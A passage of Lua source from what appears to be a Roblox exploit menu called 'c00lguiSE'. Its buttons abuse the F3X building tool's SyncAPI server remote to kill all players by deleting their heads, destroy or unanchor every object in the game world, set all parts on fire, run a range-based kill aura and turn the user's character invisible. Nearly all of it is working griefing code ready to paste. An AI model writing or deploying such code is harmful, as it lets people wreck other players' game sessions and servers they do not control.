		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
	
		function KillAll()
			for i,v in game.Players:GetPlayers() do
				spawn(function()
					SetLocked(v.Character.Head,false)
					DestroyPart(v.Character.Head)
				end)
			end
		end
		KillAll()
	
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_c6);
-- StarterGui.c00lguiSE.Main.Pages.F3X.Button.ButtonScript
local function C_c8()
local script = G2L["c8"];
	local button = script.Parent
	local tweenservice = game:GetService("TweenService")
	local input = button.Parent.Parent.Settings.AssetInput
	
	
	function click()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
	
		function Unanchor()
			for i,v in game.Workspace:GetDescendants() do
				spawn(function()
					SetLocked(v,false)
					SetAnchor(false,v)
				end)
			end
		end
		Unanchor()
	
	
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_c8);
-- StarterGui.c00lguiSE.Main.Pages.F3X.Button.ButtonScript
local function C_ca()
local script = G2L["ca"];
	local button = script.Parent
	local tweenservice = game:GetService("TweenService")
	local input = button.Parent.Parent.Settings.AssetInput
	
	
	function click()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent,types)
			local args = {
				[1] = "CreatePart",
				[2] = types,
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
	
		function Material(part,mate)
	
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Material"] = mate
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		hrpx = math.floor(char.HumanoidRootPart.CFrame.x)
		hrpz = math.floor(char.HumanoidRootPart.CFrame.z)
		hrpy = math.floor(char.HumanoidRootPart.CFrame.y)
		function SpawnBasePlate()
			CreatePart(CFrame.new(hrpx,hrpy-20,hrpz),workspace,"Spawn")
			for i,v in game.Workspace:GetChildren() do
				if v:IsA("BasePart") and v.CFrame.y == hrpy - 20 and v.CFrame.x == hrpx then
					spawn(function()
						Resize(v,Vector3.new(512, 20, 512),CFrame.new(hrpx,hrpy-20,hrpz))
						Material(v,Enum.Material.Plastic)
						Color(v,BrickColor.new("Dark stone grey"))
						SetLocked(v,true)
					end)
				end
			end
		end
		SpawnBasePlate()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_ca);
-- StarterGui.c00lguiSE.Main.Pages.F3X.Button.ButtonScript
local function C_cc()
local script = G2L["cc"];
	local button = script.Parent
	local tweenservice = game:GetService("TweenService")
	local input = button.Parent.Parent.Settings.AssetInput
	
	
	function click()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
	
		function Unanchor()
			for i,v in game.Workspace:GetDescendants() do
				spawn(function()
					SetLocked(v,false)
					DestroyPart(v)
				end)
			end
		end
		Unanchor()
	
	
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_cc);
-- StarterGui.c00lguiSE.Main.Pages.F3X.Button.ButtonScript
local function C_ce()
local script = G2L["ce"];
	local button = script.Parent
	local tweenservice = game:GetService("TweenService")
	local input = button.Parent.Parent.Settings.AssetInput
	
	
	function click()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
	
		function Unanchor()
			for i,v in game.Workspace:GetDescendants() do
				spawn(function()
					SetLocked(v,false)
					DestroyPart(v)
				end)
			end
		end
		Unanchor()
	
	
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_ce);
-- StarterGui.c00lguiSE.Main.Pages.F3X.Button.ButtonScript
local function C_d0()
local script = G2L["d0"];
	local button = script.Parent
	local tweenservice = game:GetService("TweenService")
	local input = button.Parent.Parent.Settings.ARRangeInput
	
	
	function click()
		local player = game.Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:Wait()
		local hrp = char:WaitForChild("HumanoidRootPart")
		local tool
	
		for _,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for _,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		if not tool then return end
		local remote = tool.SyncAPI.ServerEndpoint
	
		function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		function AddFire(part)
			local args = {
				[1] = "CreateDecorations",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Fire"
					}
				}
			}
			_(args)
		end
	
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
	
		local RANGE = tonumber(input.Text)
	
		task.spawn(function()
			while true do
				task.wait(0.25)
	
				for _, model in workspace:GetChildren() do
					if model:IsA("Model") and model ~= char then
						local hum = model:FindFirstChildOfClass("Humanoid")
						local root = model:FindFirstChild("HumanoidRootPart")
	
						if hum and root then
							local dist = (root.Position - hrp.Position).Magnitude
							if dist <= RANGE then
								AddFire(root)
								task.wait(0.1)
								if model:FindFirstChild("Head") then
									DestroyPart(model.Head)
								end
							end
						end
					end
				end
			end
		end)
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_d0);
-- StarterGui.c00lguiSE.Main.Pages.F3X.Button.ButtonScript
local function C_d2()
local script = G2L["d2"];
	local button = script.Parent
	local tweenservice = game:GetService("TweenService")
	local input = button.Parent.Parent.Settings.ARRangeInput
	
	
	function click()
		local player = game.Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:Wait()
		local tool
	
	
		for _, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for _, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		if not tool then return end
		local remote = tool.SyncAPI.ServerEndpoint
	
		local function _(args)
			remote:InvokeServer(unpack(args))
		end
	
	
	
	
		local function ForceSpecialMesh(part)
			for _, m in ipairs(part:GetChildren()) do
				if m:IsA("SpecialMesh") or m:IsA("BlockMesh") or m:IsA("CylinderMesh") then
					DestroyExistingMesh(part)
				end
			end
	
	
			local args = {
				"CreateMeshes",
				{
					{
						Part = part
					}
				}
			}
			_(args)
		end
	
		function DestroyExistingMesh(part)
			local args = {
				"Remove",
				{
					part:FindFirstChildOfClass("SpecialMesh")
				}
			}
			_(args)
		end
	
		function SetMeshType(part, mesh)
			local args = {
				"SyncMesh",
				{
					{
						Part = part,
						MeshType = mesh
					}
				}
			}
			_(args)
		end
	
		function SetColor(part, color)
			local args = {
				"SyncMaterial",
				{
					{
						Part = part,
						Color = color
					}
				}
			}
			_(args)
		end
	
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
	
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
	
	
		local parts = {}
	
		if char:FindFirstChild("Humanoid") and char.Humanoid.RigType == Enum.HumanoidRigType.R15 then
			local r15Parts = {
				"Head",
				"UpperTorso",
				"LowerTorso",
				"LeftUpperArm",
				"LeftLowerArm",
				"LeftHand",
				"RightUpperArm",
				"RightLowerArm",
				"RightHand",
				"LeftUpperLeg",
				"LeftLowerLeg",
				"LeftFoot",
				"RightUpperLeg",
				"RightLowerLeg",
				"RightFoot"
			}
	
			for _, name in ipairs(r15Parts) do
				local p = char:FindFirstChild(name)
				if p then
					table.insert(parts, p)
				end
			end
		else
			parts = {
				char:WaitForChild("Head"),
				char:WaitForChild("Torso"),
				char:WaitForChild("Left Arm"),
				char:WaitForChild("Right Arm"),
				char:WaitForChild("Left Leg"),
				char:WaitForChild("Right Leg")
			}
		end
	
	
	
		if button.Text == "Invisibility: OFF" then
			task.spawn(function()
				for _, part in ipairs(parts) do
					SetTrans(part, 1)
				end
			end)
			button.Text = "Invisibility: ON"
		elseif button.Text == "Invisibility: ON" then
			task.spawn(function()
				for _, part in ipairs(parts) do
					SetTrans(part, 0)
				end
			end)
			button.Text = "Invisibility: ON"
		end
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_d2);
-- StarterGui.c00lguiSE.Main.Pages.F3X.Button.ButtonScript
local function C_d4()
local script = G2L["d4"];
	local button = script.Parent
	
	
	function click()
		local button = script.Parent
	
		button.MouseButton1Down:Connect(function()
			local player = game.Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:Wait()
			local tool
	
	
			for _, v in player:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
			for _, v in game.ReplicatedStorage:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
	
			if not tool then return end
			local remote = tool.SyncAPI.ServerEndpoint
	
			local function _(args)
				remote:InvokeServer(unpack(args))
			end
	
	
	
	
			local function ForceSpecialMesh(part)
				for _, m in ipairs(part:GetChildren()) do
					if m:IsA("SpecialMesh") or m:IsA("BlockMesh") or m:IsA("CylinderMesh") then
						DestroyExistingMesh(part)
					end
				end
	
	
				local args = {
					"CreateMeshes",
					{
						{
							Part = part
						}
					}
				}
				_(args)
			end
	
			function DestroyExistingMesh(part)
				local args = {
					"Remove",
					{
						part:FindFirstChildOfClass("SpecialMesh")
					}
				}
				_(args)
			end
	
			function SetMeshType(part, mesh)
				local args = {
					"SyncMesh",
					{
						{
							Part = part,
							MeshType = mesh
						}
					}
				}
				_(args)
			end
	
			function SetColor(part, color)
				local args = {
					"SyncMaterial",
					{
						{
							Part = part,
							Color = color
						}
					}
				}
				_(args)
			end
	
			function Color(part,color)
				local args = {
					[1] = "SyncColor",
					[2] = {
						[1] = {
							["Part"] = part,
							["Color"] = color --[[Color3]],
							["UnionColoring"] = false
						}
					}
				}
				_(args)
			end
	
	
	
	
			local parts = {
				char:WaitForChild("Head"),
				char:WaitForChild("Torso"),
				char:WaitForChild("Left Arm"),
				char:WaitForChild("Right Arm"),
				char:WaitForChild("Left Leg"),
				char:WaitForChild("Right Leg")
			}
	
			local meshTypes = {
				"Brick",
				"Cylinder",
				"Head",
				"Sphere",
				"Torso",
				"Wedge"
			}
	
	
			for _, part in ipairs(parts) do
				ForceSpecialMesh(part)
			end
	
			task.wait()
	
	
			task.spawn(function()
				while true do
					task.wait()
	
					for _, part in ipairs(parts) do
						local m = meshTypes[math.random(1, #meshTypes)]
						SetMeshType(part, m)
						Color(part,Color3.new(math.random(0,255),math.random(0,255),math.random(0,255)))
					end
				end
			end)
		end)
	
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_d4);
-- StarterGui.c00lguiSE.Main.Pages.F3X.Button.ButtonScript
local function C_d6()
local script = G2L["d6"];
	local button = script.Parent
	local tweenservice = game:GetService("TweenService")
	local input = button.Parent.Parent.Settings.ARRangeInput
	
	
	function click()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function AddFire(part)
			local args = {
				[1] = "CreateDecorations",
				[2] = {
					[1] = {
						["Part"] = part,
						["DecorationType"] = "Fire"
					}
				}
			}
			_(args)
		end
		function FireParts()
			for i,v in game.Workspace:GetDescendants() do
				spawn(function()
					SetLocked(v,false)
					AddFire(v)
				end)
			end
		end
		FireParts()
	
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_d6);
-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
local function C_ea()
local script = G2L["ea"];
	local button = script.Parent
	local tweenservice = game:GetService("TweenService")
	local RunService = game:GetService("RunService")
	
	local glitchEnabled = false
	local addedConn
	
	if game:GetService("SoundService").RespectFilteringEnabled == true then
	button.Visible = false
	end
	
	function click()
		glitchEnabled = not glitchEnabled
